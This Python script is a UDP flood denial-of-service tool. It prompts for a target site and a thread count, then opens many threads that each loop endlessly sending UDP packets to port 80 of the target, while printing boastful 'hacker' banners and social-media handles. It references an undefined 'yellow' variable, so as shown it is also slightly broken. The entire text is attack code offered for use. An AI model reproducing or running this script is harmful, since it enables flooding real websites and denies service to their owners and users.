import time
import socket
import sys
import _thread
print("ahoorabm god hacker")
print("in scripet vaqei hast pas fakesh nakonid thanks")
print("id sorousham => @ahoorabm va @ahoorabm2 va @ahoorabm3 lets go")
site = input("Enter your site IP => ")
print (" "+yellow)
thread_count = input("Enter your Turbo => ")
print (" "+yellow)
ip = socket.gethostbyname(site)
UDP_PORT = 80
MESSAGE = 'ahoorabm'
print("UDP target IP:", ip)
print("UDP target port:", UDP_PORT)
time.sleep(3)
def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))
        print("Packet Sent / f6-banger ahoorabm")
        print (" "+yellow)
for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)
while 1:
    pass
